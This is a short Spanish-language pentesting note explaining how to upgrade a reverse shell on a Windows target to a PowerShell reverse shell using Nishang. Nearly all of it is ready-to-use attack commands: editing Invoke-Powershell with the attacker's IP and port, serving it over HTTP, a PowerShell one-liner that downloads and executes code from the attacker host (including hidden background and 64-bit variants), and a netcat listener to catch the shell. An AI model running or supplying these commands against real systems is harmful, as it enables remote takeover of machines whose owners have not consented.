Cuando obtenemos una shell reversa en un entorno Windows y queremos migrar a una shell Powershell que nos permite tener más comandos.

>Obtener nishang de github.
>En el directorio /opt de máquina local, descargar Nishang.
`git clone https://github.com/samratashok/nishang.git`
>Modificar el archivo /shells/Invoke-Powershell.ps1, última línea.
`Invoke-Powershell -Reverse -IPAddress <own_ip> -Port <443>`
>Compartir servidor con python donde se encuentra el archivo Invoke-Powershell.ps1 en la máquina local.
`python -m SimpleHTTPServer 80`
>Transferir archivo Invoke-Powershell.ps1 desde la máquina objetivo.
`powershell IEX(New-Object Net.WebClient).downloadString('http://<own_ip>:<puerto>/archivo'`
>Si se quiere ejecutar directamente en segundo plano:
`start /b powershell IEX(New-Object Net.WebClient).downloadString('http://<own_ip>:<puerto>/archivo'`
>Comprobar environment y process architecture en powershell
`[environment]::is64BitOperatingSystem`
`[environment]::is64BitProcess`
>Migrar a un proceso de 64 bits, solución llamar a Powershell desde la ruta nativa del sistema
`start /b C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<own_ip>:<puerto>/archivo'`
>Recibir la shell inversa en máquina local
`rlwrap nc -nlvp 443`
